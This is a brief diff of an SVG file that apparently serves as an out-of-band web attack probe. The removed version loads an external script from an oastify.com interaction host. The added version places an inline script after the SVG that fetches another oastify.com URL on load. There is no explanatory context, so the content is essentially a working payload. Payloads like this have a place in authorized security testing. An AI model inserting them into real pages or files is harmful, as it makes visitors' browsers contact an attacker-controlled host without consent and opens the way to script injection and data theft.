@@ -1,3 +1,7 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script href="http://hg1sgd9xt8qhqj7xoxxhcyt2dtjo7fv4.oastify.com/script.js"></script>
+<svg id="mysvg" width="200" height="200">
+  <rect id="box" width="100" height="100" fill="blue"/>
 </svg>
+
+<script>
+ fetch("https://b8km871rl2ibidzrgrpb4slw5nbizanz.oastify.com");
+</script>
